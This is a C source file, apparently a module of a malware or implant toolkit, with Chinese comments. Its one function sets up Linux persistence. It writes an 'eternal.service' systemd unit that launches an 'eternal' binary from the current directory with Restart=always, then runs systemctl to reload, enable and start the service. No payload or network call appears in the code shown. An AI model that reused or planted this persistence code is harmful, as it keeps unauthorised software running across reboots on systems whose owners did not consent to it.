#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "info.h"
#include "linux_persistence_systemd.h"

#ifdef SYSTEMD_MOD
void setup_systemd_persistence() {
    printf("设置systemd持久化...\n");
    const char* systemd_path = "/etc/systemd/system";
    char service_path[512];
    snprintf(service_path, sizeof(service_path), "%s/eternal.service", systemd_path);
    
    FILE *service_file = fopen(service_path, "w");
    if (service_file) {
        fprintf(service_file, "[Unit]\n");
        fprintf(service_file, "Description=Eternal Service\n");
        fprintf(service_file, "After=network.target\n\n");
        
        fprintf(service_file, "[Service]\n");
        fprintf(service_file, "ExecStart=%s/eternal\n", getcwd(NULL, 0)); // 添加当前目录下的 eternal 可执行文件路径
        fprintf(service_file, "Restart=always\n\n");
        
        fprintf(service_file, "[Install]\n");
        fprintf(service_file, "WantedBy=multi-user.target\n");
        fclose(service_file);
        
        // Reload systemd to recognize the new service, enable and start it
        system("systemctl daemon-reload");
        system("systemctl enable eternal.service");
        system("systemctl start eternal.service");
        
        printf("持久化命令已添加到systemd。\n");
    } else {
        perror("无法创建systemd服务文件");
    }
}
#endif